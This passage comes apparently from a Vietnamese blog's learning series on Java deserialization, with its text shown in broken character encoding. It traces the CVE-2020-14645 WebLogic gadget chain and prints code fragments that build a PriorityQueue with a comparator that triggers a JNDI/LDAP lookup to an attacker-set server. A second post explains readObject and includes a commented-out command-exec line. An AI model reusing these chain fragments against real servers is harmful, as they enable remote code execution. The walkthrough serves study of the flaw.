báº±ng ObjectOutputStream vÃ  ghi dá»¯ liá»‡u vÃ o file \u0026quot;poc.ser\u0026quot;. Cuá»‘i cÃ¹ng, chÃºng ta tiáº¿n hÃ nh deserialize queue tá»« file \u0026quot;poc.ser\u0026quot; báº±ng ObjectInputStream vÃ  kÃ¬ vá»ng payload sáº½ Ä‘Æ°á»£c execute nhÆ° hÃ¬nh 2.2 Debug Báº¯t Ä‘áº§u vá»›i hÃ m objectInputStream.readObject(); Trong blog trÆ°á»›c, tÃ´i cÃ³ trÃ¬nh bÃ y vá» flow cá»§a native readObject, trong Ä‘Ã³, tÃ´i cÃ³ nháº¥n máº¡nh 2 method: ObjectInputStream##readOrdinaryObjectÂ vÃ Â Method##invoke cÃ³ tÃ¡c dá»¥ng Ä‘iá»u hÆ°á»›ng luá»“ng thá»±c thi. á» Ä‘Ã¢y, ta sáº½ tháº¥y:\nTáº¡i ObjectInputStream##readOrdinaryObject: hÃ m readClassDesc() táº¡i dÃ²ng 1781 sáº½ tráº£ vá» class cá»§a PriorityQueue, truyá»n vÃ o hÃ m readSerialData() táº¡i dÃ²ng 1808 Táº¡i Method##invoke: cho tháº¥y method private void java.util.PriorityQueue.readObject(java.io.ObjectInputStream) throws java.io.IOException,java.lang.ClassNotFoundException Ä‘Æ°á»£c gá»i Sau Ä‘Ã³, chÆ°Æ¡ng trÃ¬nh sáº½ chuyá»ƒn hÆ°á»›ng vá» PriorityQueue##readObject Tá»›i Ä‘Ã¢y, chÃºng ta sáº½ tháº¥y flow liÃªn quan tá»›i blog trÆ°á»›c nhÆ° sau:\nMá»¥c tiÃªu cá»§a pháº§n nÃ y chÃºng ta sáº½ nghiÃªn cá»©u tiáº¿p flow tá»« PriorityQueue trá»Ÿ Ä‘i.\nTiáº¿p tá»¥c flow, PriorityQueue##heapify Ä‘Æ°á»£c gá»i. Method nÃ y Ä‘áº£m báº£o tÃ­nh cháº¥t cá»§a cáº¥u trÃºc dá»¯ liá»‡u (min heap hoáº·c max heap). Äiá»u nÃ y cÃ³ nghÄ©a method nÃ y sáº½ thá»±c hiá»‡n phÃ©p so sÃ¡nh á»Ÿ Ä‘Ã¢u Ä‘Ã³. HÃ£y nhÃ¬n vÃ o vÃ²ng for: Ä‘á»ƒ gá»i Ä‘Æ°á»£c siftDown() thÃ¬ giÃ¡ trá»‹ ban Ä‘áº§u cá»§a i (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) -1) â‰¥ 0 (i = 0 thÃ¬ siftDown() Ä‘Æ°á»£c gá»i 1 láº§n). TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i size â‰¥ 2 (vÃ¬ size = 1 â†’ i = -1). Do Ä‘Ã³, chÃºng ta cáº§n thiáº¿t láº­p PriorityQueue cÃ³ Ã­t nháº¥t 2 pháº§n tá»­ Ä‘á»ƒ touch tá»›i hÃ m nÃ y. CÃ¡ch implement nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 final PriorityQueue \u0026lt; Object \u0026gt; queue = new PriorityQueue \u0026lt; Object \u0026gt; (2, comparator); Object[] q = new Object[] { rowSet, rowSet }; Field queue1 = queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;); queue1.setAccessible(true); queue1.set(queue, q); Field queue2 = queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); queue2.setAccessible(true); queue2.set(queue, 2); Tiáº¿p tá»¥c Ä‘i vÃ o hÃ m PriorityQueue##siftDown CÃ³ hai option á»Ÿ Ä‘Ã¢y khi comparator null vÃ  khÃ¡c null. Theo nhÆ° tÃ´i nghiÃªn cá»©u, thÃ¬ Ä‘a sá»‘ cÃ¡c exploit Ä‘á»ƒ dÃ¹ng comparator khÃ¡c null. Vá»›i CommonCollection2,4 thÃ¬ dÃ¹ng TransformingComparator cÃ²n trong CVE nÃ y thÃ¬ dÃ¹ng ExtractorComparator. Äá»ƒ set giÃ¡ trá»‹ comparator thÃ nh ExtractorComparator nhÆ° sau:\n1 2 UniversalExtractor extractor = new UniversalExtractor(\u0026#34;getDatabaseMetaData()\u0026#34;, null, 1); final ExtractorComparator comparator = new ExtractorComparator(extractor); Khi extractor lÃ  ExtractorComparator, táº¡i hÃ m siftDownUsingComparator() thÃ¬ ExtractorComparator##compare Ä‘Æ°á»£c gá»i\nTá»›i Ä‘Ã¢y, hÃ m ExtractorComparator##compare Ä‘Æ°á»£c gá»i Táº¡i Ä‘Ã¢y, dÃ²ng 36 lÃ  toÃ¡n tá»­ 3 ngÃ´i. VÃ¬ o1 cÃ³ kiá»ƒu lÃ  JdbcRowSetImpl nÃªn cÃ¢u lá»‡nh (Comparable)this.m_extractor.extract(o1) Ä‘Æ°á»£c thá»±c thi. Máº·t khÃ¡c, this.m_extractor cÃ³ kiá»ƒu lÃ  UniversalExtractor nÃªn UniversalExtractor.extract() Ä‘Æ°á»£c gá»i. Tiáº¿p tá»¥c flow, Ä‘i vÃ o hÃ m UniversalExtractor.extractComplex táº¡i dÃ²ng 75. HÃ m extractComplex sáº½ gá»i method method.invoke(oTarget, aoParam); táº¡i dÃ²ng 205 vá»›i target lÃ  JdbcRowSetImpl vÃ  method lÃ  public java.sql.DatabaseMetaData com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() throws java.sql.SQLException Tiáº¿p tá»¥c, chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘i vÃ o com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() HÃ m getDatabaseMetaData() sáº½ gá»i phÆ°Æ¡ng thá»©c this.connect() Trong hÃ m connect nÃ y, táº¡i dÃ²ng 326, chÆ°Æ¡ng trÃ¬nh sáº½ láº¥y Ä‘á»‹a chá»‰ server tá»« hÃ m this.getDataSourceName() vÃ  gá»­i request Ä‘áº¿n server Ä‘á»ƒ láº¥y dá»¯ liá»‡u vá». Ta cÃ³ thá»ƒ set dataSource thÃ nh Ä‘á»‹a chá»‰ server cá»§a chÃºng ta nhÆ° sau: 1 2 JdbcRowSetImpl rowSet = new JdbcRowSetImpl(); rowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:8082/glnikw\u0026#34;); Bá»Ÿi vÃ¬ dataSource nÃ y chÃºng ta cÃ³ thá»ƒ control vÃ  set thÃ nh Ä‘á»‹a chá»‰ server cá»§a chÃºng ta. á» Ä‘Ã¢y, tÃ´i dÃ¹ng bá»™ cÃ´ng cá»¥ JNDI server Ä‘á»ƒ xÃ¢y dá»±ng LDAP server.\nNÃªn sau khi thá»±c hiá»‡n dÃ²ng lá»‡nh 326, payload cá»§a chÃºng ta sáº½ Ä‘Æ°á»£c thá»±c thi trÃªn server III PhÃ¢n tÃ­ch vÃ  má»• xáº» ChÃºng ta vá»«a Ä‘i qua flow cá»§a CVE-2020-14645. KhÃ¡ Ä‘Æ¡n giáº£n Ä‘Ãºng khÃ´ng ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„. Táº¥t nhiÃªn lÃ  khÃ´ng rá»“i! ÄÃ¢y lÃ  giai Ä‘oáº¡n tÃ´i thÃ­ch nháº¥t khi phÃ¢n tÃ­ch CVE, Ä‘Ã³ lÃ  Ä‘áº·t cÃ¢u há»i. Má»¥c tiÃªu chÃºng ta khÃ´ng chá»‰ dá»«ng láº¡i á»Ÿ viá»‡c hiá»ƒu flow mÃ  pháº£i â€œtÃ¬m vá» cá»™i nguá»“nâ€, Ä‘oÃ¡n Ä‘Æ°á»£c mindset, cÃ¡ch lÃ m cá»§a tÃ¡c giáº£ vÃ  Ã¡p dá»¥ng nÃ³ Ä‘á»ƒ giáº£i quyáº¿t nhá»¯ng váº¥n Ä‘á» tÆ°Æ¡ng tá»±. ÄÃ³ má»›i lÃ  â€œhá»câ€. Viá»‡c Ä‘áº·t cÃ¢u há»i sáº½ giÃºp chÃºng ta cÃ³ há»©ng thÃº vÃ  cÃ³ hÆ°á»›ng Ä‘á»ƒ nghiÃªn cá»©u. VÃ¬ Ä‘á»ƒ tráº£ lá»i cÃ¢u há»i A sáº½ cÃ³ hÃ ng loáº¡t cÃ¢u há»i B,C,D Ä‘Æ°á»£c Ä‘áº·t ra. Báº±ng cÃ¡ch lÃ m nhÆ° tháº¿, kiáº¿n thá»©c chÃºng ta Ä‘áº·t Ä‘Æ°á»£c sáº½ há»¯u Ã­ch vÃ  khÃ´ng quÃ¡ lÃ½ thuyáº¿t. 1. Táº¡i sao láº¡i lÃ  UniversalExtractor Náº¿u cÃ¡c báº¡n Ä‘Ã£ lÃ m qua CommonCollection thÃ¬ sáº½ tháº¥y chain nÃ y khÃ¡ giá»‘ng vá»›i CommonCollection4. Sá»± khÃ¡c biá»‡t á»Ÿ bÆ°á»›c chá»n comparator (CommonCollection4 chá»n TransformingComparator cÃ²n CVE-2020-14645 chá»n UniversalExtractor) Má»™t cÃ¢u há»i Ä‘áº·t ra: Táº¡i sao chá»n UniversalExtractor? CÃ³ lÃ½ do Ä‘áº·c biá»‡t gÃ¬ khÃ´ng?\nÄá»«ng quÃªn ráº±ng CVE-2020-14645 lÃ  báº£n bypass cá»§a CVE-2020-2883. Trong báº£n patch lá»—i CVE-2020-2883 sink MvelExtractor vÃ  ReflectionExtractor bá»‹ blacklisted, do Ä‘Ã³ cáº§n tÃ¬m má»™t extract class khÃ¡c cÃ³ malicious operations trong method. Dá»… dÃ ng suy luáº­n ra, UniversalExtractor cÃ³ nguá»“n gá»‘c tá»« MvelExtractor vÃ  ReflectionExtractor. Náº¿u váº­y, liá»‡u cÃ³ class nÃ o khÃ¡c vá»›i UniversalExtractor ná»¯a khÃ´ng?\nÄá»ƒ tráº£ lá»i cho cÃ¢u há»i nÃ y, chÃºng ta cáº§n pháº£i biáº¿t Ä‘Æ°á»£c cÃ¡ch tÃ¬m ra UniversalExtractor , sau Ä‘Ã³ xem thá»­ vá»›i cÃ¡ch lÃ m nÃ y, liá»‡u cÃ³ thá»ƒ tÃ¬m Ä‘Æ°á»£c class khÃ¡c hay khÃ´ng? Liá»‡u ráº±ng Ä‘Ã£ háº¿t class nhÆ° váº­y hay váº«n cÃ²n class nÃ o Ä‘Ã³ mÃ  cÃ¡c reseacher chÆ°a tÃ¬m ra (tÃ´i tin tÆ°á»Ÿng vÃ o kháº£ nÄƒng thá»© 2 hÆ¡n). 2. LÃ m sao Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c UniversalExtractor? Náº¿u tÃ´i lÃ  1 ngÆ°á»i reproduce 1 day, lÃ m sao Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c class UniversalExtractor nÃ y?\nCháº¯c háº³n, cÃ¡c anh em security researcher khi nghe cÃ¢u nÃ y, trong Ä‘áº§u sáº½ vang lÃªn hai chá»¯: diff-patch. Trong flow phÃ¢n tÃ­ch á»Ÿ pháº§n II, náº¿u Ä‘á»ƒ Ã½, cÃ¡c báº¡n sáº½ tháº¥y tÃ´i khÃ´ng Ä‘á» cáº­p Ä‘áº¿n hai pháº§n ráº¥t quan trá»ng:\nT3 protocol - cÃ¡ch mÃ  weblogic trigger nhÆ° tháº¿ nÃ o? Sau khi server gá»­i request Ä‘áº¿n JNDI server thÃ¬ flow sau Ä‘Ã³ sáº½ cháº¡y nhÆ° tháº¿ nÃ o? Äáº¿n thá»i Ä‘iá»ƒm hiá»‡n táº¡i, tÃ´i chÆ°a thá»ƒ tráº£ lá»i vÃ¬ bá»‹ thiáº¿u kiáº¿n thá»©c ná»n. Táº¥t nhiÃªn, tÃ´i sáº½ tá»± fill vÃ  tráº£ lá»i nhá»¯ng cÃ¢u há»i nÃ y náº¿u muá»‘n Ä‘i xa hÆ¡n (Ä‘Ã¢y cÅ©ng lÃ  lÃ­ do táº¡i sao tÃ´i thÃ­ch viáº¿t blog).\nDá»… hiá»ƒu, bÃ¢y giá» chÃºng ta cáº§n Ä‘i nghiÃªn cá»©u vá» cÃ¡ch diff-patch weblogic. Má»™t Ä‘iá»u khÃ¡ thÃº vá»‹ vÃ  may máº¯n khi nghiÃªn cá»©u á»Ÿ CVE-2020-14645 Ä‘Ã³ lÃ :\nCVE-2020-14645 lÃ  bypass cá»§a CVE-2020-2883 CVE-2020-2883 lÃ  bypass cá»§a CVE-2020-2555. VÃ  CVE-2020-2555 lÃ  cá»§a anh Jang - má»™t pro trong java deserialize. Trong blog cá»§a anh áº¥y cÃ³ 1 bÃ i Ä‘á» cáº­p vá» cÃ¡ch anh áº¥y tÃ¬m ra CVE-2020-2555 á»Ÿ Ä‘Ã¢y. CÃ²n ngáº§n ngáº¡i gÃ¬ ná»¯a, Ä‘á»c vÃ  lÃ m theo thÃ´i! (cÃ²n tÃ¬m Ä‘Æ°á»£c hay khÃ´ng thÃ¬ Ä‘Ã³ lÃ  cÃ¢u chuyá»‡n khÃ¡c ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚)\nIV. Tá»•ng káº¿t NhÆ° Ä‘Ã£ Ä‘á» cáº­p, series nÃ y chá»‰ giÃ nh cho beginner. Do Ä‘Ã³, blog nÃ y flow Ä‘Æ¡n giáº£n chá»‰ lÃ  báº¡n cÃ³ 1 POC vÃ  báº¡n trace theo, hiá»ƒu flow vÃ  cá»‘ gáº¯ng build láº¡i POC. Trong blog tiáº¿p theo, tÃ´i sáº½ nÃ¢ng cáº¥p flow nghiÃªn cá»©u (tá»« debug build ngÆ°á»£c láº¡i POC) V. Nguá»“n tham kháº£o Weblogicæ¼æ´åˆ†æä¹‹JNDIæ³¨å…¥-CVE-2020-14645 - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) https://paper.seebug.org/1280/##cve-2020-2883 ","description":"Tiáº¿p tá»¥c vá»›i series tá»± há»c Java Deserializee cá»§a newbie, trong bÃ i nÃ y tÃ´i trÃ¬nh bÃ y vá» CVE-2020-14645 cá»§a weblogic.","id":2,"section":"posts","tags":["java"],"title":"Khi newbie há»c Java deserialization attack: CVE-2020-14645","uri":"https://minhlongmt183.github.io/posts/khi_newbie_hoc_java_deserialization_attack_cve_2020_14645/"},{"content":"Khi newbie há»c Java deserialization attack: readObject() native I. Lá»i má»Ÿ Ä‘áº§u Sau hÆ¡n 2 thÃ¡ng há»c vá» PHP deserilazation, tÃ´i Ä‘Ã£ chuyá»ƒn qua há»c Java deserialization vá»›i tham vá»ng sáº½ rÃ¨n má»™t loáº¡i lá»—i Insecure deserialization trÃªn cÃ¡c ngÃ´n ngá»¯ PHP, JAVA, .Net ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­. VÃ¬ lÃ  má»™t Java deserialize fan thÃ¡ng 8 nÃªn má»i thá»© báº¯t Ä‘áº§u háº§u nhÆ° lÃ  sá»‘ 0. VÃ  phÆ°Æ¡ng phÃ¡p tiáº¿p cáº­n á»Ÿ Ä‘Ã¢y sáº½ lÃ  Ä‘i tá»« Ä‘Æ¡n giáº£n Ä‘áº¿n nÃ¢ng cao thÃ´ng qua rÃ¨n luyá»‡n nhiá»u hÆ¡n lÃ  Ä‘á»c lÃ½ thuyáº¿t.\nTÃ´i báº¯t Ä‘áº§u vá»›i hÃ m sink quen thuá»™c cá»§a Java Deserialization lÃ  readObject(), sau Ä‘Ã³ lÃ  cÃ¡c chain exploit Ä‘Ã£ cÃ³ sáºµn trÃªn Apache Commons Collection Ä‘á»ƒ hiá»ƒu rÃµ cÃ¡c kiáº¿n thá»©c cÆ¡ báº£n cÃ¹ng cÃ¡c kÄ© nÄƒng cÆ¡ báº£n vá» debug, setup mÃ´i trÆ°á»ng. VÃ  bÃ¢y giá» Ä‘ang trong giai Ä‘oáº¡n váº­n dá»¥ng Ä‘á»ƒ luyá»‡n táº­p trÃªn weblogic. Má»™t lá»™ trÃ¬nh khÃ¡ rÃµ rÃ ng.\nTÃ´i káº¿t thÃºc há»c táº­p vá» chain exploit Apache Commons Collection vá»›i má»™t mindmap nhÆ° sau:\nVÃ¬ dáº¡o gáº§n Ä‘Ã¢y cÅ©ng cÃ³ vÃ i task liÃªn quan vá» viá»‡c present vÃ  viáº¿t blog Ä‘á»ƒ improve kÄ© nÄƒng, nÃªn tÃ´i cÅ©ng táº­n dá»¥ng Ä‘á»ƒ viáº¿t luÃ´n, vá»›i hai má»¥c tiÃªu chÃ­nh:\nÃ”n láº¡i vÃ  hiá»ƒu rÃµ má»™t cÃ¡ch tháº¥u Ä‘Ã¡o hÆ¡n nhá»¯ng Ä‘Æ¡n vá»‹ kiáº¿n thá»©c Ä‘Ã£ há»c. Äá»“ng thá»i nÃ¢ng cao cÃ¡c kÄ© nÄƒng má»m khÃ¡c. LÃ  nÆ¡i Ä‘á»ƒ lÆ°u trá»¯ kiáº¿n thá»©c vÃ  khi cáº§n tÃ´i cÃ³ thá»ƒ láº¥y ra Ä‘á»c, Ã´n láº¡i NhÆ° tiÃªu Ä‘á» cá»§a bÃ i, chuá»—i blog nÃ y sáº½ viáº¿t vá» hÃ nh trÃ¬nh há»c Java Deserialization cá»§a má»™t newbie. Do Ä‘Ã³, trong blog sáº½ khÃ´ng cÃ³ nhá»¯ng â€œyáº¿u tá»‘ má»›i láº¡â€ hay nhá»¯ng â€œkiáº¿n thá»©c cao siÃªuâ€. Hi vá»ng cÃ¡c â€œsiÃªu nhÃ¢nâ€ cÃ³ tÃ¬nh cá» ghÃ© qua thÃ¬ Ä‘á»«ng Ä‘áº·t kÃ¬ vá»ng quÃ¡ nhiá»u!\nII. Java Deserialization 101 CÃ¢u há»i Ä‘áº§u tiÃªn mÃ  newbie nÃ o khi tiáº¿p cáº­n chá»§ Ä‘á» nÃ y cháº¯c háº³n: Deserialization lÃ  gÃ¬? NhÆ° tháº¿ nÃ o lÃ  Insecure deserialization?\nXuáº¥t phÃ¡t tá»« viá»‡c cÃ¡c á»©ng dá»¥ng giao tiáº¿p, truyá»n dá»¯ liá»‡u dÆ°á»›i dáº¡ng byte.\nHiá»‡n nay má»™t á»©ng dá»¥ng Ä‘iá»ƒn hÃ¬nh sáº½ cÃ³ nhiá»u thÃ nh pháº§n vÃ  sáº½ Ä‘Æ°á»£c phÃ¢n phá»‘i trÃªn cÃ¡c há»‡ thá»‘ng vÃ  máº¡ng khÃ¡c nhau. Trong Java, má»i thá»© Ä‘Æ°á»£c biá»ƒu diá»…n dÆ°á»›i dáº¡ng cÃ¡c Object. Náº¿u hai thÃ nh pháº§n Java muá»‘n giao tiáº¿p vá»›i nhau, cáº§n pháº£i cÃ³ má»™t cÆ¡ cháº¿ Ä‘á»ƒ trao Ä‘á»•i dá»¯ liá»‡u. Má»—i Ä‘á»‘i tÆ°á»£ng trong Java sáº½ cÃ³ cÃ¡c kiá»ƒu Ä‘á»‘i tÆ°á»£ng khÃ¡c nhau gÃ¢y khÃ³ khÄƒn trong viá»‡c trao Ä‘á»•i dá»¯ liá»‡u. Do Ä‘Ã³, cáº§n pháº£i cÃ³ má»™t giao thá»©c chung chung vÃ  hiá»‡u quáº£ Ä‘á»ƒ chuyá»ƒn Ä‘á»‘i tÆ°á»£ng giá»¯a cÃ¡c thÃ nh pháº§n.\nSerialization Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a cho má»¥c Ä‘Ã­ch nÃ y, vÃ  cÃ¡c thÃ nh pháº§n Java sá»­ dá»¥ng giao thá»©c nÃ y Ä‘á»ƒ chuyá»ƒn cÃ¡c Ä‘á»‘i tÆ°á»£ng\nThÃ´ng qua hÃ¬nh áº£nh minh há»a á»Ÿ trÃªn, ta cÃ³ thá»ƒ hiá»ƒu\nSerialization lÃ  quÃ¡ trÃ¬nh chuyá»ƒn Object thÃ nh ByteStream. Deserialization lÃ  quÃ¡ trÃ¬nh ngÆ°á»£c vá»›i Serialization.\nInsecure Deserialization lÃ  khi dá»¯ liá»‡u do ngÆ°á»i dÃ¹ng kiá»ƒm soÃ¡t Ä‘Æ°á»£c deserialize bá»Ÿi má»™t trang web. Äiá»u nÃ y cÃ³ kháº£ nÄƒng cho phÃ©p káº» táº¥n cÃ´ng thao tÃºng cÃ¡c Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c serialize Ä‘á»ƒ truyá»n dá»¯ liá»‡u cÃ³ háº¡i vÃ o code á»©ng dá»¥ng. Tháº­m chÃ­ cÃ³ thá»ƒ thay tháº¿ má»™t Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c serialize báº±ng má»™t Ä‘á»‘i tÆ°á»£ng cá»§a má»™t lá»›p hoÃ n toÃ n khÃ¡c. Má»™t Ä‘iá»ƒm cáº§n lÆ°u Ã½ á»Ÿ Ä‘Ã¢y, cÃ¡c Ä‘á»‘i tÆ°á»£ng cá»§a báº¥t ká»³ lá»›p nÃ o cÃ³ sáºµn cho trang web sáº½ Ä‘Æ°á»£c deserialize vÃ  khá»Ÿi táº¡o. VÃ¬ lÃ½ do nÃ y, insecure deserialization Ä‘Ã´i khi Ä‘Æ°á»£c gá»i lÃ  lá»— há»•ng \u0026ldquo;object injectionâ€ VÃ¬ Ä‘Ã£ cÃ³ kiáº¿n thá»©c vá» PHP deserialization attack, nÃªn tÃ´i báº¯t Ä‘áº§u vá»›i má»™t áº£nh minh há»a mÃ´ hÃ¬nh táº¥n cÃ´ng trong PHP deserialization: Attacker truyá»n vÃ o payload serialized Object vÃ  webserver Ä‘Ã£ deserialize payload nÃ y. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng cÃ³ thá»ƒ thá»±c thi cÃ¢u lá»‡nh\nVá» cÆ¡ báº£n, tÃ´i táº¡m chia quÃ¡ trÃ¬nh khai thÃ¡c Java Deserialization thÃ nh 2 giai Ä‘oáº¡n nhÆ° sau:\nApplication Vulnerability: Táº¡i bÆ°á»›c nÃ y, attacker pháº£i tÃ¬m Ä‘Æ°á»£c endpoint (source) Ä‘á»ƒ truyá»n dá»¯ liá»‡u vÃ o vÃ  má»™t hÃ m sink thá»±c hiá»‡n deserialize dá»¯ liá»‡u cá»§a attacker. Trong PHP hÃ m sink nÃ y lÃ  unserialize() cÃ²n trong Java thÃ¬ nÃ³ lÃ  readObject().\nExploit chain: Táº¡i bÆ°á»›c nÃ y, readObject() á»Ÿ bÆ°á»›c trÆ°á»›c sáº½ tá»« sink trá»Ÿ thÃ nh source vÃ  sink sáº½ lÃ  má»¥c tiÃªu cá»§a attacker (cÃ³ thá»ƒ lÃ  RCE, táº¡o file,â€¦). Vá»›i newbie, chÃºng ta sáº½ táº­p trung vÃ o exploit chain Ä‘á»ƒ rÃ¨n luyá»‡n cÃ¡c kÄ© nÄƒng cÆ¡ báº£n, cá»¥ thá»ƒ lÃ  Apache CommonsCollections\nIII. readObject() native NhÆ° Ä‘Ã£ biáº¿t, readObject lÃ  hÃ m thá»±c hiá»‡n deserialization trong Java. Do Ä‘Ã³, cÃ¡ch tiáº¿p cáº­n cá»§a tÃ´i sáº½ lÃ m 1 vÃ­ dá»¥ cÆ¡ báº£n vá» serialization vÃ  deserialization vÃ  xem luá»“ng thá»±c thi cá»§a hÃ m nÃ y nhÆ° tháº¿ nÃ o.\nTÃ´i táº¡o class User.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package nativeReadObject; import java.io.IOException; import java.io.Serializable; public class User implements Serializable { private String name; private int age; @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name = \u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age = \u0026#34; + age + \u0026#39;}\u0026#39;; } // private void readObject(java.io.ObjectInputStream stream) throws IOException { // System.out.println(\u0026#34;ReadObject overwrite\u0026#34;); // Runtime.getRuntime().exec(String.format(\u0026#34;cmd.exe /c calc\u0026#34;)); // } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public User(){} public User(String name, int age) { this.name = name; this.age = age; } } VÃ  má»™t class Ä‘á»ƒ serialize vÃ  deserialize ReadTest.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package nativeReadObject; import java.io.*; public class ReadTest { public static void main(String[] args) throws IOException, ClassNotFoundException { User user = new User(); user.setName(\u0026#34;Edisc\u0026#34;); user.setAge(23); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;user.ser\u0026#34;)); // serialize: Object =\u0026gt; byte stream oos.writeObject(user); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;user.ser\u0026#34;)); // deserialize: byte stream =\u0026gt; Object Object o = ois.readObject(); User deserUser = (User) o; System.out.println(deserUser.getName()); System.out.println(deserUser.getAge()); } } Trong class User.java, chÃºng ta chÃº Ã½ Ä‘oáº¡n code tá»« dÃ²ng 17-20. Khi khÃ´ng cÃ³ dÃ²ng code nÃ y, káº¿t quáº£ sáº½ nhÆ° sau:\nCÃ²n khi cÃ³ Ä‘oáº¡n code: Báº¡n tháº¥y chá»©? khi chÃºng ta implement readObject thÃ¬ Ä‘á»‹nh nghÄ©a cá»§a hÃ m nÃ y sáº½ bá»‹ overwrite vÃ  data tráº£ vá» lÃ  null, 0 chá»© khÃ´ng nhÆ° default. Má»™t lÆ°u Ã½ á»Ÿ Ä‘Ã¢y lÃ  kiá»ƒu dá»¯ liá»‡u private vÃ  param lÃ  java.io.ObjectInputStream stream. Äá»ƒ hiá»ƒu rÃµ hÆ¡n, ta tiáº¿n hÃ nh debug:\nÄáº§u tiÃªn, chÆ°Æ¡ng trÃ¬nh sáº½ gá»i readObject() cá»§a ObjectInputStream.java Táº¡i dÃ²ng 373, method ObjectInputStream#readObject0()sáº½ Ä‘Æ°á»£c gá»i Äoáº¡n mÃ£ trÃªn chá»‹u trÃ¡ch nhiá»‡m Ä‘á»c cÃ¡c object tá»« input. Cá»¥ thá»ƒ:\nboolean oldMode = bin.getBlockDataMode();: á» Ä‘Ã¢y, biáº¿n oldMode Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u tráº¡ng thÃ¡i hiá»‡n táº¡i cá»§a cháº¿ Ä‘á»™ dá»¯ liá»‡u khá»‘i (block data mode) trong Ä‘á»‘i tÆ°á»£ng bin (má»™t Ä‘á»‘i tÆ°á»£ng BlockDataInputStream). if (oldMode) { ... }: Náº¿u Ä‘ang á»Ÿ cháº¿ Ä‘á»™ dá»¯ liá»‡u khá»‘i cÅ© (oldMode), má»™t sá»‘ xá»­ lÃ½ Ä‘áº·c biá»‡t Ä‘Æ°á»£c thá»±c hiá»‡n. oldMode lÃ  má»™t tráº¡ng thÃ¡i khi Ä‘ang Ä‘á»c dá»¯ liá»‡u mÃ  gáº·p má»™t dá»¯ liá»‡u block khÃ´ng thá»ƒ xá»­ lÃ½ Ä‘Æ°á»£c ngay láº­p tá»©c. byte tc;: Biáº¿n tc lÃ  má»™t biáº¿n byte Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nháº­n dáº¡ng kiá»ƒu dá»¯ liá»‡u hiá»‡n táº¡i trong luá»“ng dá»¯ liá»‡u. while ((tc = bin.peekByte()) == TC_RESET) { ... }: VÃ²ng láº·p nÃ y kiá»ƒm tra xem liá»‡u cÃ³ báº¥t ká»³ mÃ£ nháº­n dáº¡ng TC_RESET nÃ o á»Ÿ Ä‘áº§u luá»“ng dá»¯ liá»‡u khÃ´ng. Náº¿u cÃ³, nÃ³ sáº½ tiáº¿p tá»¥c Ä‘á»c dá»¯ liá»‡u vÃ  thá»±c hiá»‡n cÃ¡c xá»­ lÃ½ liÃªn quan Ä‘áº¿n viá»‡c Ä‘áº·t láº¡i cÃ¡c tráº¡ng thÃ¡i cá»§a luá»“ng. depth++;: Biáº¿n depth Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ theo dÃµi Ä‘á»™ sÃ¢u cá»§a Ä‘á»‘i tÆ°á»£ng Ä‘ang Ä‘Æ°á»£c Ä‘á»c. NÃ³ tÄƒng lÃªn má»—i khi báº¯t Ä‘áº§u Ä‘á»c má»™t Ä‘á»‘i tÆ°á»£ng má»›i. switch (tc) { ... }: Cáº¥u trÃºc switch dá»±a vÃ o giÃ¡ trá»‹ cá»§a tc Ä‘á»ƒ xÃ¡c Ä‘á»‹nh kiá»ƒu dá»¯ liá»‡u cá»§a Ä‘á»‘i tÆ°á»£ng Ä‘ang Ä‘á»c vÃ  thá»±c hiá»‡n xá»­ lÃ½ tÆ°Æ¡ng á»©ng. Trong má»—i trÆ°á»ng há»£p, phÆ°Æ¡ng thá»©c thá»±c hiá»‡n xá»­ lÃ½ tÆ°Æ¡ng á»©ng vá»›i kiá»ƒu dá»¯ liá»‡u Ä‘ang Ä‘á»c, vÃ­ dá»¥ nhÆ° Ä‘á»c má»™t chuá»—i, máº£ng, Ä‘á»‘i tÆ°á»£ng thÆ°á»ng hay Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c tham chiáº¿u bá»Ÿi má»™t tham chiáº¿u. Cuá»‘i cÃ¹ng, phÆ°Æ¡ng thá»©c káº¿t thÃºc viá»‡c Ä‘á»c Ä‘á»‘i tÆ°á»£ng vÃ  tráº£ vá» káº¿t quáº£ Ä‘Ã£ Ä‘á»c Ä‘Æ°á»£c. finally { ... }: Pháº§n cuá»‘i cÃ¹ng cá»§a phÆ°Æ¡ng thá»©c Ä‘Æ°á»£c thá»±c hiá»‡n sau khi phÆ°Æ¡ng thá»©c Ä‘Ã£ Ä‘á»c xong Ä‘á»‘i tÆ°á»£ng. á» Ä‘Ã¢y, tráº¡ng thÃ¡i cá»§a luá»“ng vÃ  biáº¿n depth Ä‘Æ°á»£c cáº­p nháº­t láº¡i Ä‘á»ƒ chuáº©n bá»‹ cho 